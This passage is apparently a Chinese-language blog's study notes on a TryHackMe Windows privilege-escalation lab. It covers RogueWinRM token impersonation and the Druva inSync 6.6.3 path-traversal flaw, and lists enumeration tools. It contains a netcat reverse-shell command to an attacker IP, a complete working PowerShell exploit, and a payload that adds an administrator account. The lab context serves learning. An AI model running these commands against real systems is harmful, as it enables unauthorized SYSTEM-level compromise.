<p>现在，如果用户 Ann 登录到 FTP 服务，并且考虑到 ftp 用户具有模拟权限，则它可以借用 Ann 的访问令牌并使用它来访问她的文件。这样，文件不需要以任何方式提供对用户<code>ftp</code>访问，并且操作系统会处理授权。由于 FTP 服务正在冒充 Ann，因此在该会话期间它将无法访问 Jude 或 Bill 的文件。</p>
<p>作为攻击者，如果我们设法控制具有 SeImpersonate 或 SeAssignPrimaryToken 权限的进程，我们就可以模拟连接该进程并对其进行身份验证的任何用户。</p>
<p>在Windows系统中，你会发现LOCAL SERVICE和NETWORK SERVICE  ACCOUNTS已经拥有这样的权限。由于这些帐户用于使用受限帐户生成服务，因此如果服务需要，允许它们模拟连接用户是有意义的。 Internet  信息服务 (IIS) 还将为 Web 应用程序创建一个名为“iis apppool\defaultapppool”的类似默认帐户。</p>
<p>要使用此类帐户提升权限，攻击者需要满足以下条件： </p>
<ol>
<li>生成一个进程，以便用户可以连接该进程并对其进行身份验证，以进行模拟。</li>
<li>找到一种方法来强制特权用户连接并验证生成的恶意进程。</li>
</ol>
<p>我们将使用 RogueWinRM 漏洞来实现这两个条件。</p>
<p>首先，假设我们已经入侵了一个在 IIS 上运行的网站，并且我们已经在以下地址植入了 Web shell：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.255.156/</span><br></pre></td></tr></table></figure>

<p>我们可以使用 Web shell 检查受感染帐户的分配权限，并确认我们拥有此任务感兴趣的两项权限：</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241006120425680.png"></p>
<p>要使用RogueWinRM，我们首先需要将漏洞利用程序上传到目标机器。为了您的方便，这已经完成，您可以在<code>C:\tools\</code>文件夹中找到该漏洞。</p>
<p>RogueWinRM 漏洞利用是可能的，因为每当用户（包括非特权用户）在 Windows 中启动 BITS 服务时，它都会使用系统权限自动创建到端口 5985  的连接。端口 5985 通常用于 WinRM 服务，它只是一个公开 Powershell 控制台以通过网络远程使用的端口。可以将其想象为SSH ，但使用 Powershell。</p>
<p>如果由于某种原因，WinRM 服务没有在受害服务器上运行，则攻击者可以在端口 5985 上启动伪造的 WinRM 服务，并在启动时捕获 BITS  服务进行的身份验证尝试。如果攻击者具有SeImpersonate权限，他可以代表连接用户（即SYSTEM）执行任何命令。</p>
<p>在运行漏洞之前，我们将启动一个 netcat 侦听器以在攻击者的计算机上接收反向 shell。然后，使用我们的 Web shell 使用以下命令触发 RogueWinRM 漏洞利用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\tools\RogueWinRM\RogueWinRM.exe -p &quot;C:\tools\nc64.exe&quot; -a &quot;-e cmd.exe 10.10.253.40 4442&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241006121345871.png"></p>
<p><strong>注意：</strong>该漏洞可能需要长达 2 分钟才能发挥作用，因此您的浏览器可能会出现一段时间无响应。如果您多次运行漏洞利用程序，就会发生这种情况，因为它必须等待 BITS 服务停止才能再次启动。 BITS服务将在启动2分钟后自动停止。</p>
<p><code>-p</code>参数指定漏洞利用程序运行的可执行文件，在本例中为<code>nc64.exe</code> 。 <code>-a</code>参数用于将参数传递给可执行文件。由于我们希望 nc64 针对攻击者计算机建立反向 shell，因此传递给 netcat 的参数将为<code>-e cmd.exe ATTACKER_IP 4442</code> 。</p>
<h4 id="Task7-滥用易受攻击的软件"><a href="#Task7-滥用易受攻击的软件" class="headerlink" title="Task7 滥用易受攻击的软件"></a>Task7 滥用易受攻击的软件</h4><h5 id="打补丁的软件"><a href="#打补丁的软件" class="headerlink" title="打补丁的软件"></a>打补丁的软件</h5><p>RDP连接靶机</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp /v:10.10.99.140 /u:thm-unpriv /p:Password321</span><br></pre></td></tr></table></figure>

<p>目标系统上安装的软件可以提供各种权限升级机会。与驱动程序一样，组织和用户可能不会像更新操作系统那样频繁地更新它们。您可以使用<code>wmic</code>工具列出目标系统上安装的软件及其版本。下面的命令将转储它可以在已安装的软件上收集的信息（可能需要大约一分钟才能完成）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic product get name,version,vendor</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241006124544140.png"></p>
<p>请记住， <code>wmic product</code>命令可能不会返回所有已安装的程序。根据某些程序的安装方式，它们可能不会在此处列出。检查桌面快捷方式、可用服务或任何表明存在可能易受攻击的其他软件的痕迹始终是值得的。</p>
<p>一旦我们收集了产品版本信息，我们就可以随时在<a target="_blank" rel="noopener" href="https://www.exploit-db.com/">exploit-db</a> 、 <a target="_blank" rel="noopener" href="https://packetstormsecurity.com/">packetstorm</a>或plain old <a target="_blank" rel="noopener" href="https://www.google.com/">Google</a>等网站上在线搜索已安装软件的现有漏洞。使用 wmic 和 Google，您能在任何已安装的产品上找到已知漏洞吗？</p>
<h5 id="案例研究：Druva-inSync-6-6-3"><a href="#案例研究：Druva-inSync-6-6-3" class="headerlink" title="案例研究：Druva inSync 6.6.3"></a>案例研究：Druva inSync 6.6.3</h5><p>目标服务器正在运行 Druva inSync 6.6.3，正如<a target="_blank" rel="noopener" href="https://www.matteomalvica.com/blog/2020/05/21/lpe-path-traversal/">Matteo Malvica</a>报告的那样，该服务器容易受到权限升级的影响。该漏洞是由于对<a target="_blank" rel="noopener" href="https://www.tenable.com/security/research/tra-2020-12">Chris Lyne</a>最初报告的 6.5.0 版本的另一个漏洞应用了错误补丁而导致的。</p>
<p>该软件容易受到攻击，因为它在端口 6064 上运行具有系统权限的 RPC（远程过程调用）服务器，只能从本地主机访问。如果您不熟悉 RPC，它只是一种允许给定进程通过网络公开函数（RPC 行话中称为过程）的机制，以便其他计算机可以远程调用它们。</p>
<p>对于 Druva inSync，端口 6064 上公开的过程之一（特别是过程号 5）允许任何人请求执行任何命令。由于 RPC 服务器以 SYSTEM 身份运行，因此任何命令都以 SYSTEM 权限执行。</p>
<p>6.5.0 及更早版本中报告的原始漏洞允许不受限制地运行任何命令。提供此类功能的最初想法是远程执行 inSync 提供的一些特定二进制文件，而不是任何命令。尽管如此，仍然没有进行任何检查来确保这一点。</p>
<p>发布了一个补丁，他们决定检查执行的命令是否以字符串<code>C:\ProgramData\Druva\inSync4\</code>开头，这是允许的二进制文件应该在的位置。但是，事实证明这还不够，因为您可以简单地进行路径遍历攻击来绕过这种控制。假设您要执行<code>C:\Windows\System32\cmd.exe</code> ，但它不在允许的路径中；你可以简单地要求服务器运行 <code>C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe</code> 这样就可以成功绕过检查。</p>
<p>为了构建一个可行的漏洞利用程序，我们需要了解如何与端口 6064 通信。幸运的是，我们使用的协议很简单，要发送的数据包如下图所示：</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241006123756222.png"></p>
<p>第一个数据包只是一个包含固定字符串的 hello 数据包。第二个数据包表明我们想要执行程序 5，因为这是一个易受攻击的程序，它将为我们执行任何命令。最后两个数据包分别用于发送命令的长度和要执行的命令字符串。</p>
<p>最初由 Matteo Malvica<a target="_blank" rel="noopener" href="https://packetstormsecurity.com/files/160404/Druva-inSync-Windows-Client-6.6.3-Privilege-Escalation.html">在此</a>发布，可以在目标计算机中使用以下漏洞来提升权限并检索此任务的标志。为了您的方便，以下是原始漏洞利用代码：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ErrorActionPreference</span> = <span class="string">&quot;Stop&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;net user pwnd /add&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="built_in">New-Object</span> System.Net.Sockets.Socket(</span><br><span class="line">    [<span class="type">System.Net.Sockets.AddressFamily</span>]::InterNetwork,</span><br><span class="line">    [<span class="type">System.Net.Sockets.SocketType</span>]::Stream,</span><br><span class="line">    [<span class="type">System.Net.Sockets.ProtocolType</span>]::Tcp</span><br><span class="line">)</span><br><span class="line"><span class="variable">$s</span>.Connect(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">6064</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable">$header</span> = [<span class="type">System.Text.Encoding</span>]::UTF8.GetBytes(<span class="string">&quot;inSync PHC RPCW[v0002]&quot;</span>)</span><br><span class="line"><span class="variable">$rpcType</span> = [<span class="type">System.Text.Encoding</span>]::UTF8.GetBytes(<span class="string">&quot;<span class="variable">$</span>([char]0x0005)`0`0`0&quot;</span>)</span><br><span class="line"><span class="variable">$command</span> = [<span class="type">System.Text.Encoding</span>]::Unicode.GetBytes(<span class="string">&quot;C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c <span class="variable">$cmd</span>&quot;</span>);</span><br><span class="line"><span class="variable">$length</span> = [<span class="type">System.BitConverter</span>]::GetBytes(<span class="variable">$command</span>.Length);</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span>.Send(<span class="variable">$header</span>)</span><br><span class="line"><span class="variable">$s</span>.Send(<span class="variable">$rpcType</span>)</span><br><span class="line"><span class="variable">$s</span>.Send(<span class="variable">$length</span>)</span><br><span class="line"><span class="variable">$s</span>.Send(<span class="variable">$command</span>)</span><br></pre></td></tr></table></figure>

<p>您可以弹出 Powershell 控制台并直接粘贴漏洞来执行它</p>
<p>（该漏洞也可以在目标计算机中使用，网址为 <code>C:\tools\Druva_inSync_exploit.txt</code> ）。</p>
<p>请注意，在<code>$cmd</code>变量中指定的漏洞利用的默认有效负载将在系统中创建一个名为<code>pwnd</code>的用户，但不会为其分配管理权限，因此我们可能希望更改有效负载以获取更有用的内容。对于这个房间，我们将更改exp的<code>$cmd</code>以运行以下命令：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user pwnd SimplePass123 /add &amp; net localgroup administrators pwnd /add</span><br></pre></td></tr></table></figure>

<p>这将创建密码为<code>SimplePass123</code>的用户<code>pwnd</code>并将其添加到管理员组中。如果利用成功，您应该能够运行以下命令来验证用户<code>pwnd</code>是否存在并且是管理员组的一部分：</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241006134749975.png"></p>
<p>然后就能以管理员身份运行命令提示符，搜索下命令行</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241006134941049.png"></p>
<p>右键以管理员运行，选择我们创建的pwnd用户</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241006135024178.png"></p>
<p>成功提权SYSTEM权限</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241006135122332.png"></p>
<h4 id="Task8-专业工具"><a href="#Task8-专业工具" class="headerlink" title="Task8 专业工具"></a>Task8 专业工具</h4><p>有几个脚本可以以类似于上一个任务中看到的方式进行系统枚举。这些工具可以缩短枚举过程时间并发现不同的潜在特权升级向量。但是，请记住，自动化工具有时可能会错过权限升级。</p>
<p>以下是一些常用于识别权限升级向量的工具。请随意对这个房间中的任何机器运行它们，看看结果是否与讨论的攻击向量相匹配。</p>
<h5 id="WinPEAS"><a href="#WinPEAS" class="headerlink" title="WinPEAS"></a>WinPEAS</h5><p>WinPEAS 是一个开发用于枚举目标系统以发现权限提升路径的脚本。您可以找到有关 winPEAS 的更多信息并下载预编译的可执行文件或 .bat 脚本。  WinPEAS 将运行与上一个任务中列出的命令类似的命令并打印其输出。 winPEAS  的输出可能很长，有时难以阅读。这就是为什么最好始终将输出重定向到文件，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winpeas.exe &gt; outputfile.txt       </span><br></pre></td></tr></table></figure>

<p>WinPEAS 可以<a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">在此处</a>下载。</p>
<h5 id="PrivescCheck"><a href="#PrivescCheck" class="headerlink" title="PrivescCheck"></a>PrivescCheck</h5><p>PrivescCheck 是一个PowerShell脚本，用于搜索目标系统上的常见权限升级。它提供了 WinPEAS 的替代方案，无需执行二进制文件。</p>
<p>PrivescCheck 可<a target="_blank" rel="noopener" href="https://github.com/itm4n/PrivescCheck">在此处</a>下载。</p>
<p><strong>提醒</strong>：要在目标系统上运行 PrivescCheck，您可能需要绕过执行策略限制。为此，您可以使用<code>Set-ExecutionPolicy</code>，如下所示。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Set-ExecutionPolicy Bypass -Scope process -Force</span><br><span class="line">.\PrivescCheck.ps1</span><br><span class="line">Invoke-PrivescCheck</span><br></pre></td></tr></table></figure>

<h5 id="WES-NG-Windows-漏洞利用建议器"><a href="#WES-NG-Windows-漏洞利用建议器" class="headerlink" title="WES-NG Windows 漏洞利用建议器"></a>WES-NG Windows 漏洞利用建议器</h5><p>一些漏洞利用建议脚本（例如  winPEAS）将要求您将它们上传到目标系统并在那里运行它们。这可能会导致防病毒软件检测并删除它们。为了避免发出不必要的噪音来吸引注意力，您可能更喜欢使用 WES-NG，它将在您的攻击机器上运行（例如 Kali 或 TryHackMe AttackBox）。</p>
<p>WES-NG 是一个 Python 脚本，可以<a target="_blank" rel="noopener" href="https://github.com/bitsadmin/wesng">在此处</a>找到并下载。</p>
<p>安装后，在使用之前，键入<code>wes.py --update</code>命令来更新数据库。该脚本将引用它创建的数据库来检查是否有缺失的补丁，这些补丁可能会导致您可以利用漏洞来提升您在目标系统上的权限。</p>
<p>要使用该脚本，您需要在目标系统上运行<code>systeminfo</code>命令。不要忘记将输出定向到您需要移动到攻击计算机的 .txt 文件。</p>
<p>完成后，wes.py 可以按如下方式运行；</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wes.py systeminfo.txt</span><br></pre></td></tr></table></figure>

<h5 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h5><p>如果目标系统上已有Meterpreter shell，则可以使用 <code>multi/recon/local_exploit_suggester</code> 模块列出可能影响目标系统的漏洞并允许您提升目标系统上的权限。</p>
<h4 id="Task9-总结"><a href="#Task9-总结" class="headerlink" title="Task9 总结"></a>Task9 总结</h4><p>在这个房间中，我们介绍了 Windows 系统中可用的几种权限升级技术。这些技术应该为您提供有关攻击者提升系统权限的最常见路径的坚实背景。如果您有兴趣了解其他技术，可以使用以下资源：</p>
<ul>
<li>[PayloadsAllTheThings - Windows 权限提升](<a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology</a> and Resources&#x2F;Windows - Privilege Escalation.md)</li>
<li><a target="_blank" rel="noopener" href="https://github.com/gtworek/Priv2Admin">Priv2Admin - 滥用 Windows 权限</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/antonioCoco/RogueWinRM"> RogueWinRM 漏洞利用</a></li>
<li><a target="_blank" rel="noopener" href="https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html"> 土豆</a></li>
<li><a target="_blank" rel="noopener" href="https://decoder.cloud/"> 解码器的博客</a></li>
<li><a target="_blank" rel="noopener" href="https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf"> 令牌绑架</a></li>
<li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation">黑客技巧 - Windows 本地权限提升</a></li>
</ul>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/TryHackMe/" rel="tag"># TryHackMe</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/article/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%A1%B9%E7%9B%AE%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E9%85%8D%E7%BD%AE.html" rel="prev" title="区块链实训1">
      <i class="fa fa-chevron-left"></i> 区块链实训1
    </a></div>
      <div class="post-nav-item">
    <a href="/article/%E5%88%A9%E7%94%A8ettercap%E5%AE%9E%E7%8E%B0%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB.html" rel="next" title="利用ettercap实现中间人攻击">
      利用ettercap实现中间人攻击 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          
    <div class="comments" id="valine-comments"></div>

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0"><span class="nav-number">1.</span> <span class="nav-text">Jr Penetration Tester学习</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%80%E4%BB%8B"><span class="nav-number">1.1.</span> <span class="nav-text">网络安全简介</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9B%E6%94%BB%E6%80%A7%E5%AE%89%E5%85%A8%E6%80%A7%E7%AE%80%E4%BB%8B"><span class="nav-number">1.1.1.</span> <span class="nav-text">进攻性安全性简介</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Task1-%E4%BB%80%E4%B9%88%E6%98%AF%E8%BF%9B%E6%94%BB%E6%80%A7%E5%AE%89%E5%85%A8%EF%BC%9F"><span class="nav-number">1.1.1.1.</span> <span class="nav-text">Task1 什么是进攻性安全？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task2-%E5%85%A5%E4%BE%B5%E6%82%A8%E7%9A%84%E7%AC%AC%E4%B8%80%E5%8F%B0%E8%AE%A1%E7%AE%97%E6%9C%BA"><span class="nav-number">1.1.1.2.</span> <span class="nav-text">Task2 入侵您的第一台计算机</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task3-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E7%9A%84%E5%B7%A5%E4%BD%9C"><span class="nav-number">1.1.1.3.</span> <span class="nav-text">Task3 网络安全领域的工作</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1%E6%80%A7%E5%AE%89%E5%85%A8%E7%AE%80%E4%BB%8B"><span class="nav-number">1.2.</span> <span class="nav-text">防御性安全简介</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Task1-%E9%98%B2%E5%BE%A1%E6%80%A7%E5%AE%89%E5%85%A8%E7%AE%80%E4%BB%8B"><span class="nav-number">1.2.1.</span> <span class="nav-text">Task1 防御性安全简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Task2-%E9%98%B2%E5%BE%A1%E6%80%A7%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F"><span class="nav-number">1.2.2.</span> <span class="nav-text">Task2 防御性安全领域</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5%E4%B8%AD%E5%BF%83-%EF%BC%88SOC%EF%BC%89"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">安全运营中心 （SOC）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%95%B0%E5%AD%97%E5%8F%96%E8%AF%81%E5%92%8C%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94-%EF%BC%88DFIR%EF%BC%89"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">数字取证和事件响应 （DFIR）</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%95%B0%E5%AD%97%E5%8F%96%E8%AF%81"><span class="nav-number">1.2.2.2.1.</span> <span class="nav-text">数字取证</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94"><span class="nav-number">1.2.2.2.2.</span> <span class="nav-text">应急响应</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90"><span class="nav-number">1.2.2.2.3.</span> <span class="nav-text">恶意软件分析</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Task3-%E9%98%B2%E5%BE%A1%E6%80%A7%E5%AE%89%E5%85%A8%E7%9A%84%E5%AE%9E%E9%99%85%E7%A4%BA%E4%BE%8B"><span class="nav-number">1.2.3.</span> <span class="nav-text">Task3 防御性安全的实际示例</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%83%8C%E6%99%AF"><span class="nav-number">1.2.3.1.</span> <span class="nav-text">背景</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1%E6%80%A7%E5%AE%89%E5%85%A8%E7%BB%83%E4%B9%A0"><span class="nav-number">1.2.3.2.</span> <span class="nav-text">防御性安全练习</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-Hacking%E7%AE%80%E4%BB%8B"><span class="nav-number">1.3.</span> <span class="nav-text">Web Hacking简介</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%81%8D%E5%8E%86%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F"><span class="nav-number">1.3.1.</span> <span class="nav-text">遍历应用程序</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Task1-%E6%9F%A5%E7%9C%8B%E9%A1%B5%E9%9D%A2%E6%BA%90"><span class="nav-number">1.3.1.1.</span> <span class="nav-text">Task1 查看页面源</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task2-%E5%BC%80%E5%8F%91%E4%BA%BA%E5%91%98%E5%B7%A5%E5%85%B7-inspector"><span class="nav-number">1.3.1.2.</span> <span class="nav-text">Task2 开发人员工具-inspector</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task3-%E5%BC%80%E5%8F%91%E4%BA%BA%E5%91%98%E5%B7%A5%E5%85%B7-%E8%B0%83%E8%AF%95%E5%99%A8"><span class="nav-number">1.3.1.3.</span> <span class="nav-text">Task3 开发人员工具 - 调试器</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task4-%E5%BC%80%E5%8F%91%E4%BA%BA%E5%91%98%E5%B7%A5%E5%85%B7-%E7%BD%91%E7%BB%9C"><span class="nav-number">1.3.1.4.</span> <span class="nav-text">Task4 开发人员工具 - 网络</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">1.3.2.</span> <span class="nav-text">信息搜集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Task1-%E6%89%8B%E5%8A%A8%E5%8F%91%E7%8E%B0-robots-txt"><span class="nav-number">1.3.2.1.</span> <span class="nav-text">Task1 手动发现-robots.txt</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task2-%E6%89%8B%E5%8A%A8%E5%8F%91%E7%8E%B0-Favicon"><span class="nav-number">1.3.2.2.</span> <span class="nav-text">Task2 手动发现-Favicon</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task3-%E6%89%8B%E5%8A%A8%E5%8F%91%E7%8E%B0-Sitemap-xml"><span class="nav-number">1.3.2.3.</span> <span class="nav-text">Task3 手动发现-Sitemap.xml</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task4-%E6%89%8B%E5%8A%A8%E5%8F%91%E7%8E%B0-HTTP%E8%AF%B7%E6%B1%82%E5%A4%B4"><span class="nav-number">1.3.2.4.</span> <span class="nav-text">Task4 手动发现-HTTP请求头</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task5-%E6%89%8B%E5%8A%A8%E5%8F%91%E7%8E%B0-%E6%A1%86%E6%9E%B6%E5%A0%86%E6%A0%88"><span class="nav-number">1.3.2.5.</span> <span class="nav-text">Task5 手动发现 - 框架堆栈</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task6-%E5%BC%80%E6%BA%90%E6%83%85%E6%8A%A5-%E8%B0%B7%E6%AD%8C%E6%90%9C%E7%B4%A2%E8%AF%AD%E6%B3%95"><span class="nav-number">1.3.2.6.</span> <span class="nav-text">Task6 开源情报-谷歌搜索语法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task7-%E5%BC%80%E6%BA%90%E6%83%85%E6%8A%A5-Wappalyzer"><span class="nav-number">1.3.2.7.</span> <span class="nav-text">Task7 开源情报-Wappalyzer</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task8-%E5%BC%80%E6%BA%90%E6%83%85%E6%8A%A5-Github"><span class="nav-number">1.3.2.8.</span> <span class="nav-text">Task8 开源情报-Github</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task9-%E5%BC%80%E6%BA%90%E6%83%85%E6%8A%A5-S3-Buckets"><span class="nav-number">1.3.2.9.</span> <span class="nav-text">Task9 开源情报-S3 Buckets</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task10-%E8%87%AA%E5%8A%A8%E5%8F%91%E7%8E%B0"><span class="nav-number">1.3.2.10.</span> <span class="nav-text">Task10 自动发现</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%90%E5%9F%9F%E6%9E%9A%E4%B8%BE"><span class="nav-number">1.3.3.</span> <span class="nav-text">子域枚举</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Task1-%E5%BC%80%E6%BA%90%E6%83%85%E6%8A%A5-SSL-TLS-%E8%AF%81%E4%B9%A6"><span class="nav-number">1.3.3.1.</span> <span class="nav-text">Task1 开源情报-SSL&#x2F;TLS 证书</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task2-%E5%BC%80%E6%BA%90%E6%83%85%E6%8A%A5-%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E"><span class="nav-number">1.3.3.2.</span> <span class="nav-text">Task2 开源情报-搜索引擎</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task3-DNS-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="nav-number">1.3.3.3.</span> <span class="nav-text">Task3  DNS 暴力破解</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task4-%E5%BC%80%E6%BA%90%E6%83%85%E6%8A%A5-Sublist3r"><span class="nav-number">1.3.3.4.</span> <span class="nav-text">Task4 开源情报-Sublist3r</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task5-%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA"><span class="nav-number">1.3.3.5.</span> <span class="nav-text">Task5 虚拟主机</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87"><span class="nav-number">1.3.4.</span> <span class="nav-text">身份验证绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Task1-%E7%94%A8%E6%88%B7%E5%90%8D%E6%9E%9A%E4%B8%BE"><span class="nav-number">1.3.4.1.</span> <span class="nav-text">Task1 用户名枚举</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Task2-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="nav-number">1.3.4.2.</span> <span 